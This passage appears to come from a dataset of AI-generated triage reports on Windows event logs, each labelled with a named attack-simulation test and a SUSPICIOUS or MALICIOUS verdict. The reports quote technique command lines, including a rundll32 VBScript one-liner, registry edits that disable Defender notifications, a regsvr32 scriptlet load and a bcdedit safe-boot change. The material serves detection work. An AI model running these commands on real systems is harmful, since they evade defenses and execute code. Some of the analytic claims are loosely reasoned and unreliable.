  - Implement stricter access and execution controls to prevent the misuse of admin or system-level permissions.
  - Conduct regular security awareness training to educate users on recognizing suspicious activity.

### Final Resolution:
**SUSPICIOUS** - The logs present evidence of activities that are not typical for standard operations and warrant further investigation, particularly concerning the process invocation patterns and registry changes detected."
Indirect Command Execution - pcalua.exe,"Based on the provided Windows event logs, let's analyze each of them for any suspicious activity:

1. **System Log:**
   - Not much activity seen here besides a time synchronization event. This is standard behavior and not suspicious on its own.

2. **Sysmon Log:**
   - A series of events showing process creation and termination:
     - **Processes like `hostname.exe`, `conhost.exe`, `whoami.exe`, and `wevtutil.exe` are seen executing**. These are common Windows system utilities. Each of these is executed with `High` integrity level, indicative of being executed with administrative privileges.
     - The `cmd.exe` process is observed running with a command line argument that includes `pcalua.exe -a calc.exe`. This seems to involve running the Windows calculator for compatibility tests, a somewhat benign operation but could be flagged as suspicious due to unusual use of `pcalua.exe` commonly associated with the Program Compatibility Assistant.
     - Following through, `calc.exe` is launched by `pcalua.exe`, which supports the compatibility assistant task, but the chain involving `cmd.exe` raises potential suspicion for exploitation of typical legitimate tools (LOLbins) for malicious intents.

3. **Specific Anomalies Noted:**
   - Frequent execution of `wevtutil.exe` and `conhost.exe` could indicate enumeration or manipulation of event logs, possibly to cover tracks.
   - The `cmd.exe` execution with both `pcalua.exe -a calc.exe` and another calculator path suggests benign usage but warrants a closer look due to the possibility of tool abuse in actual targeted attacks.

4. **Processes Executing under SYSTEM User:**
   - Regular system processes like `svchost.exe`, `sppsvc.exe`, and `TiWorker.exe` running under `NT AUTHORITY\SYSTEM` indicating legitimate system usage.

5. **Application Log:**
   - Evidence of the Software Protection Platform Service interacting with licensing, typical of licensing verification and positively routine.

**Analysis:**
Overall, the observed events encompass typical system utility execution but contain specific actions worth scrutiny due to potential exploitation scenarios:
- Use of utilities (`wevtutil.exe`, `whoami.exe`) for standard administrative tasks but intrinsic association with potential misuses (like credential harvesting or event log tampering).
- The presence of `cmd.exe` running pcalua with elements of benign usage (calculator operations).

**Resolution:**

- **SUSPICIOUS**: The activity captured in the logs does not definitively indicate overt malicious activities, like process injection or known malware signatures. However, concerning patterns—such as unexpected uses of utilities, privilege execution level, and enumeration undertaken—point towards an area warranting caution and further examination.

**Guidance on How to Proceed:**
1. **Further Investigate Command-line Usage:** Examine logs and system traces for any unexpected command-line executions and correlate with user activity logs. Confirm legitimacy of invoked processes.
2. **Review User Access Controls:** Ensure the `admin_test` account or similar has proper usage constraints and logging enabled.
3. **Inspect Event Logs:** Scrutinize full event logs to determine any inconsistencies or signs of log manipulation.
4. **Enable Additional Monitoring:** Increase monitoring for subsequent occurrences of similar activities. Use additional threat hunting techniques leveraging typical behavioral patterns of known threats."
Disable Win Defender Notification,"After a thorough analysis of the provided Windows event logs, the following observations have been made:

1. **Time Synchronization Changes:**
   - Several events indicate that the system time was adjusted. This can sometimes be indicative of activities aiming to mask or manipulate log time stamps, though it is also common for systems to adjust time via synchronization with a time server. The changes appear minor, suggesting normal system behavior.

2. **Use of Command-Line Tools:**
   - The execution of `cmd.exe` with the command `reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 1 /f` stood out. This command is used to modify registry settings to disable Windows Defender notifications. This action could be a step taken by malware to avoid detection.

3. **Process Execution:**
   - There is a pattern of processes related to Microsoft Edge updating. These appear to be legitimate background update activities as evidenced by the process paths and verifications based on standard Microsoft procedures. They involve `MicrosoftEdgeUpdate.exe` and related executables, which usually execute during update checks.

4. **Execution of Utilities:**
   - `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are all legitimate Windows utilities. Their usage here appears to align with typical system administrative activities or automated system tasks, especially since they are tied to user `SERVER002\admin_test` with a high integrity level.

5. **Overall System Behavior:**
   - There are numerous instances of system utilities being executed, particularly under the `SERVER002\admin_test` account. While these actions look legitimate in a system administration context, they should be verified against planned or expected activity for the user in question.

**Assessment:**
- **Suspicious Registry Modification:** The command to disable Windows Defender notifications arouses suspicion as it could assist in obfuscating malicious activity. It demands further scrutiny because, while it could be part of a legitimate policy enforcement by an administrator, it is also a tactic used by malware.
- **Other Activities:** The other logged activities (system time sync, utility executions) appear benign, aligning with routine system operations or standard updates.

**Resolution:**
- **SUSPICIOUS** - The modification of the Windows Defender notification setting is atypical user behavior and should be investigated further. This might involve verifying if there was a legitimate administrative task that required this change or analyzing the origin and intent further to rule out the possibility of malware."
Javascript in registry,"### Analysis of the Logs:

The logs provided reflect a sequence of events that indicate potential malicious activity on the Windows host. Here is an analysis of the suspicious activities observed:

#### 1. PowerShell Logs:
- **Suspicious PowerShell Command**: The use of PowerShell to modify the registry with a command like `{New-ItemProperty ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" -Name data -Value ""<script>""}` is unusual and highly indicative of malicious intent. This could be an attempt to execute or set up a script in the Internet Settings, possibly for further malicious exploitation.

#### 2. Sysmon Logs:
- **Unusual Process Executions**:
  - PowerShell execution from `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` with the command to modify registry settings as described above.
  - A series of process creations involving `MicrosoftEdgeUpdate.exe`, with unusual command-line arguments related to pinging and updating, suggesting misuse beyond the typical update process.

#### 3. Security Logs:
- **Privilege Escalation and High Integrity Level**: 
  - Multiple instances of the `admin_test` user acquiring a high privilege level with an elevated token (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.`). This pattern can be indicative of attempted privilege escalation by a user or an entity trying to gain higher access rights.

#### 4. System Logs:
- **Time Discrepancy**: There's a time adjustment reflected in the logs. While this could be benign for syncing purposes, in conjunction with other suspicious activities, it might indicate tampering to mislead audit logs or investigations.

### Assessment of Situation:
The combination of registry modification attempts via PowerShell, unusual process activities in both Sysmon and PowerShell logs, and patterns of elevated privileges are highly indicative of malicious activity. 

### Threats and Risks Identified:
- **Possible Malware Activity**: The PowerShell command modifying registry entries to include a script is a strong indicator of a potential malware installation or configuration attempt.
- **Unauthorized Privilege Escalation**: Elevated privileges for the `admin_test` user suggest potential privilege escalation attempts, increasing risks of further system compromise.

### Guidance on How to Proceed:
1. **Immediate Isolation**: Isolate the affected system (Server002) from the network to prevent any lateral movement or data exfiltration.
2. **System Analysis**: Conduct a deeper forensic analysis on the PowerShell and registry activities to understand the scope of the compromise.

Rundll32 execute VBscript command using Ordinal number,"Upon reviewing the provided Windows event logs from the specified host, here is a detailed analysis:

**Suspicious or Anomalous Behavior:**

1. **Command Execution with Malicious Potential (Sysmon Event ID 1):**
   - The log entry indicates the execution of `cmd.exe` with a command that abuses `rundll32` to invoke VBScript as follows:
     ```
     ""cmd.exe"" /c rundll32 vbscript:""\..\\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)
     ```
   - This command is often associated with executing arbitrary code and is frequently observed in malicious activities like script-based attacks.

2. **Repeated Use of NT AUTHORITY\SYSTEM (Sysmon Event ID 1 and Event ID 5):**
   - Multiple processes, particularly `MicrosoftEdgeUpdate.exe` and various Edge installer executables, are being executed under the `NT AUTHORITY\SYSTEM` account, which is standard for system-level tasks. However, the sheer number of activities and lack of explicit parent-child hierarchies in some instances can be indicative of malicious activities leveraging legitimate applications.

3. **Time Discrepancy (System Event ID 1 & Security Event ID 4616):**
   - There are changes in system time recorded very closely, which could either indicate a misconfiguration or tampering. However, this alone isn't conclusive of malicious activity.

**Malicious Activity or Compromise Indicators:**

- The execution of scripts and commands through `cmd.exe` using `rundll32` to launch a calculator is a common indicator of script-based attacks. This particular method of using `rundll32` to execute VBScript is a known attack vector used by adversaries to bypass security controls.

- The presence of numerous administrative privileges (Security Log, Event ID 4672) being granted to the user `admin_test`, combined with the suspicious command execution, strengthens concerns about the potential misuse of elevated privileges.

- The irregular system time change (Security Event ID 4616 and System Event ID 1) could potentially be a strategy to evade time-based security logging systems but would require further evidence to definitively classify as malicious.

**Assessment and Resolution:**

Given the identified use of `rundll32` to execute scripts, which is strongly indicative of a suspicious or malicious pattern, and the presence of unusual privilege escalations, the event logs lean towards a potential compromise.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Containment:**
   - Isolate the affected machine from the network to prevent lateral movement by potential attackers.
2. **In-depth Analysis:**
   - Conduct a full review and analysis of running processes, scheduled tasks, and start-up programs to identify additional suspicious activities.
   - Perform a comprehensive malware scan to detect and remove any potentially malicious software.
3. **Review Permissions and Credentials:**
   - Review and possibly revoke the administrative privileges granted to `admin_test` and other accounts if unnecessary.
4. **Correlate with Network Activity:**
   - Check network logs for any unusual outbound connections or activity at the times of suspicious events.
5. **Deploy Monitoring and Patching:**
   - Ensure that all systems are up-to-date with the latest security patches.
   - Strengthen monitoring and logging to capture and alert similar activities in the future."
Invoke HTML Application - Jscript Engine Simulating Double Click,"Based on the provided Windows event logs, several activities stand out as potentially suspicious and may indicate malicious behavior:

1. **PowerShell Execution**: The logs show execution of PowerShell scripts with a specific PowerShell command: `Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick`. This behavior is unusual because it involves the creation or manipulation of an HTA (HTML Application) file, a known technique used by attackers to exploit Windows Script Host capabilities for executing malicious code.

2. **Process Execution**: There are records of multiple wevtutil.exe and conhost.exe executions. While these processes can be legitimate, their frequency and rapid succession in the logs without apparent legitimate cause can be an indicator of an attack possibly trying to disable event logging or manipulate console outputs.

3. **UsoClient.exe Execution**: The log shows the execution of `UsoClient.exe` with the command line `StartStoreUpdates`, which, while legitimate, can also be used in attempts to trigger updates or mimic a legitimate process to conceal malicious activity.

4. **Wevtutil.exe Usage**: Multiple invocations of `wevtutil.exe` may indicate attempts to clear or query Windows Event Logs, a common behavior observed in post-exploitation activity to cover tracks.

5. **Unusual User Activity**: All suspicious activities are executed by the user 'admin_test', which might be either a legitimate administrator doing maintenance work or an account that has been compromised.

**Assessment**:
This combination of PowerShell with HTA file manipulation, rapid execution of potentially malicious processes (such as `wevtutil.exe`), and the potential for log manipulation creates a strong case for potential compromise.

**Guidance**:
- Conduct a thorough investigation of the user account `admin_test` to verify its legitimacy and ensure it has not been compromised.
- Investigate the source and the creation of the HTA file referenced in the PowerShell command to determine if it is associated with known malware.
- Review system logs before and after this sequence of events to identify any changes or malicious indicators.
- Ensure that any reverse shells or modifications to system configurations are identified and mitigated.
- Check endpoint security solutions and their logs for any alerts or quarantines related to these observed behaviors.
- Consider isolating the affected system from the network to prevent further possible spread or data exfiltration.

**Final Assessment**: MALICIOUS - The observed activities are consistent with known attack vectors and indicate a high likelihood of a malicious compromise."
Activate Windows NoClose Group Policy Feature,"Upon reviewing the provided Windows event logs, I have conducted an analysis and identified activities that raise concerns regarding potential malicious behavior. Below is a detailed assessment based on the event logs:

### Suspicious or Anomalous Activities:
1. **Event ID 4616 (Security Log):** There are multiple time change events by the `LOCAL SERVICE` account involving the `svchost.exe` process. Time manipulation can be an indicator of an attacker attempting to mislead log analysis or cover malicious activities.

2. **Process Execution (Sysmon Log):** 
   - **Execution of `cmd.exe` with Registry Modification:**
     The execution of `C:\\Windows\\System32\\cmd.exe` includes command-line arguments for modifying Windows explorer policies (`reg add ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"" /v NoClose /t REG_DWORD /d 1 /f`). This action is suspicious as it involves modifying system registry keys often used to enforce restrictive policies or disrupt normal user actions.
   - **Numerous `wevtutil.exe` Executions:**
     Overly frequent usage of `wevtutil.exe` to manipulate or query event logs might indicate attempts to clear event logs or hide malicious activities.
   - **Suspicious `whoami.exe` and `hostname.exe` Usage:**
     These utilities were executed, possibly as part of reconnaissance activities to collect user and system information, which can be a step in a penetration testing or attack process.
   
3. **Application Log:**
   - The log entries from the `edgeupdate` provider, indicating ""Service stopped,"" may indicate normal operations related to application updates (such as Edge updates). However, combined with other registry modifications and frequent process executions, they could indicate a facilitator for unrelated malicious activity.

### Malicious Identifiers:
- **Unauthorized Registry Modification:**
   The modification to the registry through `cmd.exe` and `reg.exe` commands are clear indicators of potentially malicious activity, often associated with attempts to restrict user actions or system shutdowns.

### Threat Assessment:
Based on the entries analyzed, there are evident signs of potentially malicious activities via unauthorized registry changes, system information gathering, and possible manipulation or deletion of event logs.

### Resolution:
Given the identified evidence of suspicious registry modifications and time changes, along with the presence of reconnaissance commands and frequent utility executions indicative of log manipulation attempts, the activity within the logs falls under a resolution of **MALICIOUS**.

### Recommendations for Next Steps:
1. **Immediate Containment and Analysis:**
   - Isolate the affected system from the network to prevent further actions by the malicious actor.
   - Conduct a thorough forensic analysis of the system to identify the full scope of the compromise and retrieve potential artifacts or malicious binaries.
   
2. **User and System Security Review:**
   - Review privilege and account usage, especially of the `admin_test` user, to determine whether the account has been compromised.
   
3. **Log Review and Event Log Backup:**
   - Ensure that event logs are backed up and review them periodically to identify ongoing threats.

4. **Implement Security Controls:**
   - Consider strengthening access controls and monitoring tools, such as enhancing logging mechanisms, implementing stricter user permissions, and monitoring for unauthorized registry changes.

This comprehensive analysis recommends considering the logged activities malicious and taking appropriate action to safeguard the integrity and security of the system."
Regsvr32 local COM scriptlet execution,"Based on the analysis of the provided Sysmon, Application, PowerShell, System, and Security logs from the Windows machine named Server002, I have identified several aspects that require attention:

### Analysis:

1. **Sysmon Events:**
   - There are multiple instances of processes such as `powershell.exe`, `wevtutil.exe`, `cmd.exe`, and `regsvr32.exe` executed by the user `SERVER002\admin_test`. 
   - Notably, a particularly concerning event is the execution of `cmd.exe` with a command involving `regsvr32.exe` and a script file `RegSvr32.sct` located in a temporary directory:
     ```
     ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\src\RegSvr32.sct"" scrobj.dll
     ```
   - **Indicators of Malicious Activity:**
     - The use of `regsvr32.exe` with an SCT (scriptlet) file is a known technique for executing code from a remote source and is often used in living-off-the-land attacks to bypass security controls.
     - The presence of this command execution, given the context, points towards potential malicious behavior.

2. **Application Events:**
   - The logs indicate ongoing operations related to Microsoft Edge Update, which appear legitimate as these are routine updates. However, these events are not the focus compared to the suspicious use of `regsvr32.exe`.

3. **Windows Defender:**
   - Windows Defender appears to be active, which provides a baseline security layer. However, the activity in question suggests that an evasive technique was potentially used that could bypass real-time protections.

4. **Absence of Detailed PowerShell, System, and Security Logs:**
   - There is no additional suspicious activity logged in the PowerShell, System, or Security logs. This absence may indicate gaps in logging or that incidents were not captured by these logs.

### Assessment:

- **SUSPICIOUS:** The execution of `regsvr32.exe` with an unorthodox command line involving a scriptlet file in a temporary folder is a strong indicator of suspicious activity. This technique is frequently utilized for security evasion and unauthorized code execution, suggesting potential malicious intent.

### Guidance on How to Proceed:

- **Immediate Actions:**
  - Block or monitor the execution of `regsvr32.exe` with script/NCO files across the organization if not used in legitimate operations.
  - Investigate the file path and script `RegSvr32.sct` thoroughly to determine its origin and purpose.
  - Check for other anomalies around the same timestamps across different logs, such as network connections or file changes.

- **Further Investigation:**
  - Conduct a deeper forensic analysis involving memory dumps and network traffic analysis around the time of suspicious activity.
  - Review and enhance endpoint protection settings and ensure that security tools are capable of logging and alerting on suspicious scripting activities like those involving `regsvr32.exe`.
  - Consider isolating the affected machine from the network for a detailed forensic investigation.

- **Preventive Measures:**
  - Update detection and response rules to capture living-off-the-land techniques.
  - Conduct security awareness training focusing on techniques like the misuse of `regsvr32.exe` and other native Windows tools for unauthorized purposes.

Given the suspicious nature of the observed activity and the common abuse of `regsvr32.exe` in attack scenarios, further investigation is strongly advised to clarify the intent and scope of the potential compromise."
Command Execution with NirCmd,"Based on the provided logs, I will highlight the key events that suggest potential suspicious or malicious activity, supporting my assessment.

### Analysis

1. **Security Log Events:**
   
   - **Event ID 4672:** This event signifies special privileges assigned, typically appearing in normal operations when a service or system process executes with elevated privileges. However, frequent occurences can be a red flag if associated with non-system users or unexpected applications, but in these logs, SYSTEM is listed as the subject.
   - **Event ID 4798:** Indicates attempts to enumerate privileged domain accounts. The consistent enumeration, possibly seeking admin accounts, raises suspicion but requires more context to determine if abnormal.

2. **PowerShell Log Events:**

   - **Events Show PowerShell Activity:** The use of PowerShell to execute nircmd.exe is suspicious. NirCmd is often used legitimately to create shortcuts and alter system settings, yet it can be abused for stealthy operations like hiding the system clock or other parts of the UI as demonstrated with the script: `nircmd.exe win child class ""Shell_TrayWnd"" hide class ""TrayClockWClass""`. The obfuscation and execution of an unauthorized utility through PowerShell from a temporary directory suggest malicious intent.

3. **Sysmon Log Events:**

   - **Event ID 1 and 5 (nircmd.exe Execution):** There is consistent usage of `nircmd.exe`, hidden operations initiated through cmd.exe with PowerShell as a parent process (`nircmd.exe win child class Shell_TrayWnd hide class TrayClockWClass`). This specific behavior points towards actions usually aligned with system reconnaissance or preparation steps for a more malicious operation.
   - **Event ID 1 (Process Creation):** Frequent process creation by `admin_test` involving PowerShell, CMD, and NirCmd hints at potentially unauthorized administrative activity.

4. **Miscellaneous Logs:**

   - **Edge Update Events:** Regular updates and checks related to Microsoft Edge. Though normal for a system update, consider the security context if suspicious access patterns or privilege escalations coincide.

### Conclusion

The logs show:
- Unauthorized use of PowerShell to execute scripts leveraging NirCmd to modify the UI.
- Enumeration of privileged accounts.
- Usage of NirCmd in a potentially obfuscated way to manipulate system visibility, often characteristic of stealth operations.

**Resolution: SUSPICIOUS**

While individual actions such as `NirCmd` use may not be inherently malicious, their combination with enumerated privileges and PowerShell scripts from a temp directory strongly suggests further investigation is warranted. 

### Recommendations:

1. **Immediate containment:**
   - Isolate the system from the network to prevent potential further malicious activities.
   
2. **Detailed Analysis:**
   - Perform a full malware scan and memory analysis.
   - Check the system's integrity and review accounts `admin_test` and related logs for unauthorized access or privilege use.

3. **Review Policies:**
   - Implement stricter policies and monitoring around PowerShell usage and script execution.
   - Conduct user training for recognizing and reporting abnormal system behavior.

Act promptly to identify and stop potential threats before they escalate."
DiskShadow Command Execution,"### Detailed Log Analysis:

#### Sysmon Log Highlights:
1. **PowerShell Execution:**
   - Instances of `powershell.exe` executing with a command involving `diskshadow.exe`:
     - EventRecordID 18009: `""powershell.exe"" & {C:\\Windows\\System32\\diskshadow.exe -S C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data.txt}`
   - The use of `diskshadow.exe` via PowerShell is unconventional without a valid reason, as `diskshadow.exe` is a tool for working with shadow copies. It could be potentially used to modify or access shadow copies, which might be indicative of malicious activity aiming to cover tracks or extract sensitive information.

2. **Wevtutil.exe Usage:**
   - Several entries of `wevtutil.exe`:
     - Multiple usages close in succession.
   - This tool is used to manage Windows event logs; frequent usage could indicate an attempt to clear or manipulate logs to cover activity.

3. **Conhost.exe Activity:**
   - Numerous instances of `conhost.exe`, typically benign unless spawned in an abnormal pattern. The combination of `conhost.exe` instances in conjunction with other suspicious activity, such as extensive use of `diskshadow.exe` and `wevtutil.exe`, is unusual and suggests potential suspicious activity.

4. **Hostname.exe and Whoami.exe Usage:**
   - These are benign tools (`hostname.exe` and `whoami.exe`) typically used to gather system information but do not indicate malicious intent standing alone.

#### Application Log Highlights:
- Activity logs for Microsoft Edge Update, which appears expected and normal for system updating processes. These events correspond to typical system maintenance and are not suspicious on their own.

#### Windows PowerShell Log Highlights:
- PowerShell executing the command tied to `diskshadow.exe`:
  - This corroborates the suspicious PowerShell activity seen in Sysmon logs. PowerShell's execution of `diskshadow.exe` is not typical unless being utilized for very specific administrative purposes or with malicious intent.

### Assessment of the Situation:
- The use of `diskshadow.exe` via PowerShell suggests potential malicious behavior, as it's typically used for system management and not expected in regular user operations, especially when combined with suspicious context.
- The frequent and successive invocation of `wevtutil.exe` might indicate usage to alter or clear event logs as part of avoiding detection.
- Combined, these indications suggest potentially malicious intent requiring further investigation.

### Recommended Actions:
1. **Immediate Response:**
   - Investigate any related file or script placed at `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data.txt` and the surrounding context (e.g., origin, timestamps).
   - Verify the legitimacy and purpose of processes invoking `diskshadow.exe` and the associated PowerShell blocks.

2. **Monitoring:**
   - Continuously monitor the system for additional unusual behavior and validate all scheduled tasks and scripts in use.
   - Implement stricter logging and alerting for such tools' usage.

3. **Forensic Analysis:**
   - If unauthorized access or modifications are suspected, perform a more comprehensive forensic analysis to uncover any other potential indicators of compromise.

### Final Resolution:
- **SUSPICIOUS**: The activity contains elements that are not typical for regular user or administrative operations and merits further investigation to eliminate or confirm malicious activity."
Rundll32 advpack.dll Execution,"Upon reviewing the provided Windows event logs, a few activities stand out as potentially suspicious, suggesting the possibility of malicious activity or the need for further investigation:

1. **Unusual Command Execution:** There is a command execution logged in the Sysmon logs involving `cmd.exe` which then runs `rundll32.exe` with `advpack.dll` and an inf file located in a user's temp directory:  
   - Command Line: `""cmd.exe"" /c rundll32.exe advpack.dll,LaunchINFSection ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\src\\data.011.inf"",DefaultInstall_SingleUser,1,`
   - This execution appears to be scripting or automation related but could indicate a unwanted or malicious script executing from a temporary directory. Such usage of `rundll32` is often associated with attempts to run DLLs in suspicious contexts and may indicate compromise.

2. **Process Executions Involving SYSTEM Integrity Level:** The execution of processes like `wevtutil.exe`, `wevtutil.exe` sequentially followed by `whoami.exe` and from there `cmd.exe` leading into `rundll32.exe` suggests an attempt to access system-level commands. Additionally, launching processes with a high integrity level (`High` or `System`), while not inherently malicious, can be considered suspicious if they were not expected or part of routine administrative tasks, particularly when spawned by other processes in non-standard sequences.

3. **Privilege Use Identifiers:** Security logs (Event ID 4672) indicate that the SYSTEM account was granted a range of privileges including `SeDebugPrivilege`, which can be used to manipulate system processes, potentially indicating exploitation or preparation for privilege escalation.

4. **Microsoft Edge Update Processes:** Several processes related to Microsoft Edge Update run sequentially, suggesting either a legitimate update process or potentially a misused mechanism. These include processes like `MicrosoftEdgeUpdate.exe` running with various command-line options. While common in systems with Edge installed, this should be cross-verified against expected update activity.

5. **Lack of Context in PowerShell Log:** The absence of any specific logs from Windows PowerShell is concerning as it might indicate missing logging practices, especially when PowerShell processes have been initiated (as indicated in Sysmon).

6. **`conhost.exe`’s Frequent Invocation:** The `conhost.exe` is often used as a support process for command-line applications. An unusually high number of instances might suggest scripted or automated activities.

**Assessment: SUSPICIOUS**

While the Sysmon logs suggest potentially routine system operations during updates or scheduled tasks, the specific command involving `rundll32.exe` and the origin of file paths from a temporary directory associated with these processes make it necessary to conduct further investigation. It might represent unusual behavior possibly indicating malicious activity.

**Guidance on How to Proceed:**
- **Immediate Action:** Consider isolating the machine from the network to prevent lateral movement if malicious activity is confirmed.
- **Further Review:** Analyze the referenced files (e.g., `data.011.inf`) and their context to understand their purpose and legitimacy.
- **User Verification:** Verify the legitimacy of `admin_test` user activities, potentially with user interviews or cross-verification with expected job roles or responsibilities.
- **Review Scheduled Tasks:** Ensure any scheduled tasks match expected system operations and approvals.
- **Log Enhancements:** Implement enhanced logging specifically for PowerShell activities to capture more detailed command information.
- **Review Windows Defender logs:** Although it reports as being ""ON"", checking for any logs of detection and responses related to executions detailed in this period could provide more context.

Engaging threat hunting or incident response teams might be considered based on subsequent findings to fully ensure there is no active compromise within the infrastructure."
Safe Mode Boot,"**Log Analysis Report**

**Overview:**
This report provides an analysis of the provided Sysmon, System, Security, and Application logs captured from ""Server002"". The primary focus is to identify any suspicious or malicious activities that could indicate a potential compromise.

**Sysmon Logs Analysis:**

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` were executed by the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate system tool for managing Windows Event Logs, frequent and rapid execution might suggest log manipulation or enumeration.

2. **Execution of `HOSTNAME.EXE` and `whoami.exe`:**
   - These commands are typically used for enumeration. Although valid commands, repeated or automated execution may indicate reconnaissance activity by an attacker.

3. **Command Prompt (`cmd.exe`) Execution with BCD Edit:**
   - An execution of `cmd.exe` with the command-line argument `/c bcdedit /set safeboot network` was detected. This is a critical indicator, as it modifies the boot configuration to start in safe mode with networking, which can be used to evade defenses or prepare for further malicious activities.

**Security and System Logs Analysis:**

- **Time Discrepancies:**
  - The logs indicate that system time adjustments were made by the `svchost.exe` process running under `LOCAL SERVICE`. Time changes can suggest an attempt to manipulate time-sensitive security measures, though no direct malicious action is identified from this in isolation.

**Assessment & Conclusion:**

The sequence of events and processes observed suggest some potentially suspicious activity. The use of `bcdedit` to modify system boot settings is particularly concerning and aligns with behavior often associated with malware or an intruder preparing a system for controlled access or data exfiltration.

**Resolution:** 
- **SUSPICIOUS**: The logs contain activities that warrant further investigation, particularly focusing on the execution of `bcdedit` command and frequent use of `wevtutil.exe`.

**Recommendations:**

1. **Immediate Review of User Actions:**
   - Validate the authenticity and intent of actions performed by the user `SERVER002\admin_test`. Determine if the actions were intentional and legitimate.

2. **Investigate System Changes:**
   - Review the boot configuration and other system settings for unauthorized changes, especially given the alteration to Safe Boot settings.

3. **Monitoring and Alerts:**
   - Increase monitoring for similar activities across the environment and consider implementing alerts for execution of critical system utilities like `bcdedit.exe`.

4. **Conduct a Threat Hunt:**
   - Conduct a deeper investigation or threat hunt to ensure that no other malicious activities or threats are present in the environment.

5. **Security Policy Review:**
   - Review administrative access policies and ensure that proper logging and monitoring is in place, particularly for sensitive actions such as time changes and boot configuration modifications."
InstallUtil Uninstall method call - -U variant,"Based on the provided logs, here's a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **PowerShell Use for Executing Scripts:**
   - The logs show the execution of PowerShell commands with references such as `powershell.exe & {# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly...}`. The use of scripting files located in temporary directories and DLL loading (`data.004.dll`) is a red flag, commonly associated with suspicious operations.

2. **System Utility Usage:**
   - We observe multiple invocations of system utilities such as `InstallUtil.exe`, which is being used for DLL operations. `InstallUtil.exe` is a legitimate tool often misused for executing malicious payloads.

3. **Compiling Activities:**
   - There are activities showing the use of `csc.exe` (C# Compiler) and `cvtres.exe` (Resource Conversion Utility), which indicates that the system is compiling code. This is not standard behavior on production systems unless for application development purposes, indicating potentially malicious script compilation.

4. **High Integrity Level:**
   - The actions are executed with a high integrity level, indicating administrative privileges. This level of access allows for broader system impact if the actions are malicious.

5. **Execution from Temp Directories:**
   - Executions were originating from `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`, suggesting the use of temporary directories commonly used by both attackers to obfuscate activities and general software installation tasks.

### Indications of Malicious Activity or Compromise:
- The sequence of PowerShell commands, including dynamic compilation using .NET utilities (`csc.exe`), and the usage of `InstallUtil.exe`, align with tactics used by attackers to execute code without dropping an executable file onto the disk — a known technique called ""fileless malware.""
- The failed test harness function `Invoke-BuildAndInvokeInstallUtilAssembly`, the mismatch between actual and expected output can indicate exploitation attempts or testing of malicious scripts.

### Assessment and Potential Threats:
The behavior captured in these logs is typical of sophisticated fileless malware attempting persistence or lateral movement within a network:
- Dynamic code compilation and execution.
- Usage of built-in Windows utilities (like `InstallUtil.exe`).
- High-integrity execution in temporary directories.

### Resolution:
**MALICIOUS** - The patterns strongly indicate malicious activities involving suspicious PowerShell scripting, compilation tasks using system utilities, and attempts at executing potentially malicious payloads stored in temporary directories.

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Isolate the affected host (Server002) to prevent further potential spread within the network.
  
2. **In-Depth Forensics:**
   - Perform a thorough malware analysis on the collected scripts and binaries found in the temporary directories.
   - Investigate user `SERVER002\\admin_test` for any unauthorized use or impersonation.

3. **Review Security Policies:**
   - Tighten permissions and implement policy controls to restrict administrative execution for nonsystem accounts.
   - Use Application Whitelisting (AppLocker) to prevent unauthorized PowerShell scripts.

4. **Enhance Monitoring:**
   - Increase logging and monitor for similar activities across the network using security solutions that can detect fileless malware techniques."
Ursnif Malware Registry Key Creation,"### Analysis of the Windows Event Logs

Based on the provided event logs from the Windows host `Server002`, here is a detailed analysis of potential indicators of malicious activity:

#### System Logs
1. **Time Changes**: Multiple time update events (EventID 1 and 24) are logged by the `Microsoft-Windows-Kernel-General` provider. The time adjustments are minor, and they result from the syncing of time with an external time source (`time.windows.com`), which is standard behavior for time synchronization in Windows environments. It does not immediately suggest malicious activity.

2. **System Services**: The `svchost.exe` process makes appearances frequently as part of typical Windows operations, handling services. The time synchronization events are also conducted through this process. There are no anomalies in its use here that suggest compromise.

#### Sysmon Logs
1. **Process Creation Events**: A series of processes are created under the user `SERVER002\admin_test`, which include legitimate system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. This activity in itself is not unusual but should be corroborated against known administrative actions.

2. **Command Execution and Registry Modification**: 
   - The execution of `cmd.exe` with the command line to modify the registry key under `HKCU\\Software` is suspicious. Command lines targeting registry settings can indicate attempts to plant persistence mechanisms or alter system behavior in a way that supports malicious activities.
   - The registry modification attempt uses reg.exe to add a registry entry with potentially encoded data (`72656463616e617279`), which doesn’t immediately appear inherently good or bad without further context or decoding.

3. **Integrity Level and User**: All logged events show execution under `High` integrity levels and are associated with `SERVER002\admin_test`. It’s important to verify if this administrative user account was permitted to execute these actions legitimately.

#### Security Logs
- **Time Changes**: The `Microsoft-Windows-Security-Auditing` provider logs time change events which are consistent with the System log entries. The changes do not immediately imply malicious activity, correlating with the system time sync observation.

### Assessment

The logs provide evidence of the following:
- Audit of processes mostly running as part of routine system activities.
- Notable, however, is the execution of commands that alter registry settings without clear legitimate purpose, which necessitates a closer look for signs of script-based attacks or persistence strategies.

Based on the analysis, the situation can be summarized with a resolution of **SUSPICIOUS**. This indicates that while a majority of the observed behavior aligns with routine system activities, there are entries (particularly related to command-line and registry modifications) that warrant further investigation to rule out any potential compromise.

### Recommended Actions
- **Investigate Registry Changes**: Decode the binary data being written to the registry to understand its purpose and origin.
